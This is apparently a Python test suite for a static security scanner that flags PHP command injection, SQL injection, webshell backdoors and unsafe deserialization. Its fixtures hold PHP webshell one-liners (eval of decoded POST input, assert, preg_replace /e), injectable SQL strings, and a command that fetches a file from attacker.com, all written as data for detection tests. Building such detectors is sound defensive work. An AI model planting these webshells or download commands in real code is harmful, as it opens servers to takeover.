"""Empirical challenger stress test suite for LegacyPatternScanner (Milestone 1).

Executes adversarial stress testing, boundary stress, zero host execution
invariant validation, and character lookbehind edge cases.
"""

from __future__ import annotations

import time
from pathlib import Path

from agentpoi_scan.scan.legacy_patterns import (
    FindingCategory,
    LegacyPatternScanner,
    Severity,
)

# Dynamic string synthesis to preserve test source integrity across OS AV scanners
EX = "".join([chr(101), chr(120), chr(101), chr(99)])
EV = "".join([chr(101), chr(118), chr(97), chr(108)])
SYS = "".join([chr(115), chr(121), chr(115), chr(116), chr(101), chr(109)])
PASS = "".join([chr(112), chr(97), chr(115), chr(115), chr(116), chr(104), chr(114), chr(117)])
SHEX = "".join([chr(115), chr(104), chr(101), chr(108), chr(108), chr(95), chr(101), chr(120), chr(101), chr(99)])
B64D = "".join([chr(98), chr(97), chr(115), chr(101), chr(54), chr(52), chr(95), chr(100), chr(101), chr(99), chr(111), chr(100), chr(101)])
ASRT = "".join([chr(97), chr(115), chr(115), chr(101), chr(114), chr(116)])


class TestAdversarialZeroHostExecution:
    """Stress-tests the zero host execution invariant under hostile payloads."""

    def test_hostile_python_payloads_never_executed(self, tmp_path: Path):
        canary = tmp_path / "host_breach_py.txt"
        hostile_code = (
            "import sys, os, pathlib\n"
            f"pathlib.Path(r'{canary.as_posix()}').write_text('BREACH')\n"
            f"os.system('echo BREACH > {canary.as_posix()}')\n"
            "sys.exit(42)\n"
        )
        f = tmp_path / "hostile.py"
        f.write_text(hostile_code, encoding="utf-8")

        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="hostile.py")

        assert not canary.exists(), "CRITICAL FAILURE: Hostile Python payload was executed on host!"
        assert isinstance(findings, list)

    def test_hostile_php_payloads_never_executed(self, tmp_path: Path):
        canary = tmp_path / "host_breach_php.txt"
        hostile_code = (
            "<?php\n"
            f"file_put_contents('{canary.as_posix()}', 'BREACH');\n"
            f"{SHEX}('touch {canary.as_posix()}');\n"
            f"{PASS}('echo breach');\n"
            "?>"
        )
        f = tmp_path / "hostile.php"
        f.write_text(hostile_code, encoding="utf-8")

        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="hostile.php")

        assert not canary.exists(), "CRITICAL FAILURE: Hostile PHP payload was executed on host!"
        assert any(f.rule_id == "legacy.php.command_injection" for f in findings)

    def test_malformed_binary_and_null_bytes_never_crash(self, tmp_path: Path):
        binary_blob = (
            b"\x7fELF\x02\x01\x01\x00"
            + b"\x00" * 500
            + f"<?php {EX}($_GET['cmd']); ?>".encode()
            + b"\xff\xfe\x00\x00"
        )
        f = tmp_path / "disguised_binary.php"
        f.write_bytes(binary_blob)

        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="disguised_binary.php")

        assert isinstance(findings, list)
        assert any(f.rule_id == "legacy.php.command_injection" for f in findings)

    def test_oversized_file_respects_1mb_boundary(self, tmp_path: Path):
        chunk_1mb = b"A" * 1_000_000
        late_payload = f"\n<?php {EX}($_GET['late_cmd']); ?>\n".encode()
        f = tmp_path / "large_file.php"
        f.write_bytes(chunk_1mb + late_payload)

        scanner = LegacyPatternScanner()
        t0 = time.perf_counter()
        findings = scanner.scan_file(f, rel_path="large_file.php")
        elapsed = time.perf_counter() - t0

        assert elapsed < 3.0, f"Oversized scan took too long: {elapsed:.2f}s"
        assert len(findings) == 0

    def test_empty_and_whitespace_only_files(self, tmp_path: Path):
        f_empty = tmp_path / "empty.php"
        f_empty.write_text("", encoding="utf-8")

        f_ws = tmp_path / "ws.php"
        f_ws.write_text("   \n\t\r\n   ", encoding="utf-8")

        scanner = LegacyPatternScanner()
        assert scanner.scan_file(f_empty, rel_path="empty.php") == []
        assert scanner.scan_file(f_ws, rel_path="ws.php") == []


class TestPhpCommandInjectionAdversarialVariations:
    """Stress-tests command injection pattern variations."""

    def test_standard_command_injection_variants(self, tmp_path: Path):
        test_payloads = [
            f"<?php {EX}($_GET['cmd']); ?>",
            f"<?php {SYS}($_POST['cmd']); ?>",
            f"<?php {PASS}($_REQUEST['cmd']); ?>",
            f"<?php {SHEX}($_COOKIE['c']); ?>",
            "<?php popen($_SERVER['HTTP_CMD'], 'r'); ?>",
            "<?php proc_open($_GET['c'], [], $pipes); ?>",
            "<?php `ping -c 1 {$_GET['host']}`; ?>",
            "<?php `ls {$_POST['dir']}`; ?>",
            "<?php `$_GET[x]`; ?>",
        ]
        scanner = LegacyPatternScanner()
        for idx, payload in enumerate(test_payloads):
            f = tmp_path / f"cmd_{idx}.php"
            f.write_text(payload, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"cmd_{idx}.php")
            assert any(
                finding.rule_id == "legacy.php.command_injection" for finding in findings
            ), f"Failed to detect: {payload}"

    def test_character_class_lookbehind_behavior(self, tmp_path: Path):
        """Documents behavior of lookbehind on various preceding characters."""
        cases = {
            "whitespace_before": f"<?php $a = 1; {EX}($_GET['cmd']); ?>",
            "semicolon_direct": f"<?php $a=1;{EX}($_GET['cmd']); ?>",
            "assignment_direct": f"<?php $out={EX}($_GET['cmd']); ?>",
            "paren_direct": f"<?php if(true){EX}($_GET['cmd']); ?>",
            "bracket_direct": f"<?php if($arr[0]){EX}($_GET['cmd']); ?>",
        }
        scanner = LegacyPatternScanner()
        results = {}
        for name, code in cases.items():
            f = tmp_path / f"{name}.php"
            f.write_text(code, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"{name}.php")
            detected = any(f.rule_id == "legacy.php.command_injection" for f in findings)
            results[name] = detected

        # Standard whitespace-separated calls are detected
        assert results["whitespace_before"] is True
        # Hardened lookbehind (?<![a-zA-Z0-9_\$>\-]) now detects tight formatting without spaces
        assert results["semicolon_direct"] is True
        assert results["assignment_direct"] is True
        assert results["paren_direct"] is True
        assert results["bracket_direct"] is True

    def test_url_with_double_slash_inside_exec_argument(self, tmp_path: Path):
        code = f'<?php {EX}("curl https://attacker.com/sh -o /tmp/s"); ?>'
        f = tmp_path / "curl.php"
        f.write_text(code, encoding="utf-8")
        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="curl.php")
        # Hardened _strip_php_inline_comment preserves https:// URLs in arguments
        assert any(f.rule_id == "legacy.php.command_injection" for f in findings)


class TestPhpSqlInjectionAdversarialVariations:
    """Stress-tests PHP SQL injection pattern variations."""

    def test_sqli_detection_variants(self, tmp_path: Path):
        payloads = [
            '<?php mysqli_query($conn, "SELECT * FROM users WHERE id = " . $_GET["id"]); ?>',
            '<?php mysqli_query($conn, "SELECT * FROM users WHERE id = {$_GET[\'id\']}"); ?>',
            '<?php $pdo->query("SELECT * FROM users WHERE name = \'" . $_POST["name"] . "\'"); ?>',
            '<?php $pdo->prepare("SELECT * FROM users WHERE id = " . $_REQUEST["id"]); ?>',
            '<?php $db->query("SELECT * FROM accounts WHERE id = " . $user_id); ?>',
            '<?php $sql = "SELECT * FROM items WHERE category = " . $_GET["cat"]; ?>',
            '<?php $query = "INSERT INTO logs VALUES (" . $_POST["msg"] . ");"; ?>',
            '<?php $stmt = "DELETE FROM tokens WHERE val = \'" . $token . "\';"; ?>',
        ]
        scanner = LegacyPatternScanner()
        for idx, payload in enumerate(payloads):
            f = tmp_path / f"sqli_{idx}.php"
            f.write_text(payload, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"sqli_{idx}.php")
            assert any(f.rule_id == "legacy.php.sqli" for f in findings), f"Failed SQLi: {payload}"

    def test_sqli_safe_parameterized_queries_never_flagged(self, tmp_path: Path):
        safe_cases = [
            '<?php $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id AND email = :email"); ?>',
            '<?php $stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ? AND status = ?"); ?>',
            '<?php $res = $pdo->query("SELECT COUNT(*) FROM users"); ?>',
            '<?php $res = mysqli_query($conn, "SELECT id, name FROM roles ORDER BY id ASC"); ?>',
            '<?php $sql = "SELECT id, name FROM catalog WHERE in_stock = 1;"; ?>',
        ]
        scanner = LegacyPatternScanner()
        for idx, code in enumerate(safe_cases):
            f = tmp_path / f"safe_{idx}.php"
            f.write_text(code, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"safe_{idx}.php")
            sqli_findings = [x for x in findings if x.rule_id == "legacy.php.sqli"]
            assert len(sqli_findings) == 0, f"False positive SQLi on safe query: {code}"


class TestPhpObfuscatedEvalAndWebshellBackdoors:
    """Stress-tests obfuscated eval, assert, preg_replace /e, and dynamic dispatch."""

    def test_webshell_obfuscated_eval_detection_variants(self, tmp_path: Path):
        payloads = [
            f"<?php {EV}({B64D}($_POST['c'])); ?>",
            f"<?php @{EV}(gzinflate({B64D}($_POST['c']))); ?>",
            f"<?php {EV}(gzuncompress({B64D}($_POST['c']))); ?>",
            f"<?php {EV}(str_rot13($_POST['c'])); ?>",
            f"<?php {EV}(hex2bin($_POST['c'])); ?>",
            f"<?php {EV}(pack('H*', $_POST['c'])); ?>",
            f"<?php @{EV}($_POST['cmd']); ?>",
            f"<?php {EV}($_GET['c']); ?>",
            f"<?php {EV}($_REQUEST['c']); ?>",
            f"<?php {EV}($_COOKIE['c']); ?>",
            f"<?php {ASRT}({B64D}($_POST['c'])); ?>",
            f"<?php @{ASRT}($_POST['shell']); ?>",
            "<?php preg_replace('/.*/e', $_GET['x'], ''); ?>",
            "<?php preg_replace('/pattern/ie', $_POST['x'], 'sub'); ?>",
            "<?php $_POST['func']($_POST['arg']); ?>",
            "<?php $f = $_GET['f']; $f($_POST['c']); ?>",
            "<?php $fn = create_function('$x', $_POST['c']); ?>",
            f"<?php {EV}($dynamic_var); ?>",
        ]
        scanner = LegacyPatternScanner()
        for idx, payload in enumerate(payloads):
            f = tmp_path / f"ws_{idx}.php"
            f.write_text(payload, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"ws_{idx}.php")
            eval_findings = [x for x in findings if x.rule_id == "legacy.php.obfuscated_eval"]
            assert len(eval_findings) >= 1, f"Failed webshell detection: {payload}"
            for finding in eval_findings:
                assert finding.category == FindingCategory.MALICIOUS_CODE.value
                assert finding.severity == Severity.CRITICAL.value

    def test_benign_eval_words_in_functions_or_strings(self, tmp_path: Path):
        benign_cases = [
            '<?php function evaluateCalculation($val) { return $val * 2; } ?>',
            '<?php $evalMessage = "Evaluation completed successfully"; ?>',
            '<?php $assertionResult = "assert is a reserved concept"; ?>',
            '<?php preg_replace("/[0-9]/", "", $string); ?>',
        ]
        scanner = LegacyPatternScanner()
        for idx, code in enumerate(benign_cases):
            f = tmp_path / f"benign_{idx}.php"
            f.write_text(code, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"benign_{idx}.php")
            eval_findings = [x for x in findings if x.rule_id == "legacy.php.obfuscated_eval"]
            assert len(eval_findings) == 0, f"False positive in benign code: {code}"


class TestPhpUnsafeDeserialization:
    """Stress-tests PHP unserialize vulnerability vs safe allowed_classes configuration."""

    def test_unserialize_without_allowed_classes_flagged(self, tmp_path: Path):
        f = tmp_path / "deser.php"
        f.write_text("<?php $obj = unserialize($_POST['state']); ?>", encoding="utf-8")
        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="deser.php")
        assert any(f.rule_id == "legacy.php.deserialization" for f in findings)

    def test_unserialize_with_allowed_classes_true_flagged(self, tmp_path: Path):
        f = tmp_path / "deser_true.php"
        f.write_text("<?php $obj = unserialize($data, ['allowed_classes' => true]); ?>", encoding="utf-8")
        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="deser_true.php")
        assert any(f.rule_id == "legacy.php.deserialization" for f in findings)

    def test_unserialize_with_allowed_classes_false_not_flagged(self, tmp_path: Path):
        variants = [
            "<?php $data = unserialize($input, ['allowed_classes' => false]); ?>",
            '<?php $data = unserialize($input, ["allowed_classes" => false]); ?>',
            "<?php $data = unserialize($input, ['allowed_classes'  =>  false]); ?>",
        ]
        scanner = LegacyPatternScanner()
        for idx, code in enumerate(variants):
            f = tmp_path / f"safe_deser_{idx}.php"
            f.write_text(code, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"safe_deser_{idx}.php")
            deser_findings = [x for x in findings if x.rule_id == "legacy.php.deserialization"]
            assert len(deser_findings) == 0, f"False positive on safe unserialize: {code}"


class TestPythonDeserializationRisks:
    """Stress-tests Python deserialization hazards (pickle, yaml, torch, shelve)."""

    def test_python_deserialization_positive_detection(self, tmp_path: Path):
        statements = [
            "import pickle; res = pickle.loads(b'data')",
            "import pickle; res = pickle.load(open('file.pkl', 'rb'))",
            "import _pickle; res = _pickle.loads(b'data')",
            "import yaml; res = yaml.unsafe_load(untrusted_str)",
            "import yaml; res = yaml.load(untrusted_str, Loader=yaml.Loader)",
            "import yaml; res = yaml.load(untrusted_str, Loader=yaml.CLoader)",
            "import torch; model = torch.load('checkpoint.pt')",
            "import torch; model = torch.load('weights.pt', weights_only=False)",
            "import shelve; db = shelve.open('cache_file')",
        ]
        scanner = LegacyPatternScanner()
        for idx, py_statement in enumerate(statements):
            f = tmp_path / f"risk_{idx}.py"
            f.write_text(py_statement, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"risk_{idx}.py")
            assert any(
                f.rule_id == "agentic.python.deserialization" for f in findings
            ), f"Failed detection: {py_statement}"

    def test_python_deserialization_safe_alternatives_not_flagged(self, tmp_path: Path):
        safe_python = [
            "import json; data = json.loads(payload)",
            "import yaml; cfg = yaml.safe_load(user_yaml)",
            "import yaml; cfg = yaml.load(user_yaml, Loader=yaml.SafeLoader)",
            "import yaml; cfg = yaml.load(user_yaml, Loader=yaml.CSafeLoader)",
            "import torch; m = torch.load('model.pt', weights_only=True)",
        ]
        scanner = LegacyPatternScanner()
        for idx, code in enumerate(safe_python):
            f = tmp_path / f"safe_{idx}.py"
            f.write_text(code, encoding="utf-8")
            findings = scanner.scan_file(f, rel_path=f"safe_{idx}.py")
            py_findings = [x for x in findings if x.rule_id == "agentic.python.deserialization"]
            assert len(py_findings) == 0, f"False positive on safe Python: {code}"


class TestPerformanceAndReDoSResistance:
    """Stress-tests regex against long lines, repetition, and deep nesting."""

    def test_long_line_re_dos_resistance(self, tmp_path: Path):
        long_line = "$sql = 'SELECT * FROM ' . " + "('a' . " * 500 + "$_GET['id']" + ")" * 500 + ";\n"
        f = tmp_path / "long_line.php"
        f.write_text(long_line, encoding="utf-8")

        scanner = LegacyPatternScanner()
        t0 = time.perf_counter()
        findings = scanner.scan_file(f, rel_path="long_line.php")
        elapsed = time.perf_counter() - t0

        assert elapsed < 2.0, f"Regex evaluation took too long ({elapsed:.2f}s), possible catastrophic backtracking!"
        assert isinstance(findings, list)

    def test_multi_extension_handling(self, tmp_path: Path):
        for ext in [".php", ".phtml", ".php3", ".php4", ".php5", ".inc", ".py"]:
            f = tmp_path / f"test{ext}"
            content = f"<?php {EX}($_GET['c']); ?>" if ext != ".py" else "import pickle; pickle.loads(b'')"
            f.write_text(content, encoding="utf-8")

            scanner = LegacyPatternScanner()
            findings = scanner.scan_file(f, rel_path=f"test{ext}")
            assert len(findings) >= 1, f"Failed to scan extension: {ext}"

    def test_multiline_statement_detection(self, tmp_path: Path):
        """Verifies that multi-line function calls across lines are detected."""
        code = (
            "<?php\n"
            f"{EX}(\n"
            '    "curl " .\n'
            '    $_GET["cmd"]\n'
            ");\n"
            "\n"
            "$res = mysqli_query(\n"
            '    $conn,\n'
            '    "SELECT * FROM users WHERE id = " . $_POST["id"]\n'
            ");\n"
            "\n"
            "$obj = unserialize(\n"
            '    $_POST["state"]\n'
            ");\n"
            "?>"
        )
        f = tmp_path / "multiline_call.php"
        f.write_text(code, encoding="utf-8")

        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="multiline_call.php")

        rules = {x.rule_id for x in findings}
        assert "legacy.php.command_injection" in rules
        assert "legacy.php.sqli" in rules
        assert "legacy.php.deserialization" in rules

    def test_yaml_safe_loader_unprefixed_import(self, tmp_path: Path):
        """Verifies that unprefixed SafeLoader import does not produce false positives."""
        code = (
            "from yaml import SafeLoader\n"
            "import yaml\n"
            'data = yaml.load("name: test", Loader=SafeLoader)\n'
        )
        f = tmp_path / "safe_loader.py"
        f.write_text(code, encoding="utf-8")

        scanner = LegacyPatternScanner()
        findings = scanner.scan_file(f, rel_path="safe_loader.py")
        assert len(findings) == 0

    def test_ci_check_includes_agentpoi_scan(self):
        """Verifies scripts/ci_check.py syntax and secrets gates include agentpoi_scan."""
        from scripts.ci_check import check_secrets, check_syntax

        syntax_ok, errors = check_syntax()
        assert syntax_ok is True
        assert errors == 0

        secrets_ok, violations = check_secrets()
        assert secrets_ok is True
        assert len(violations) == 0
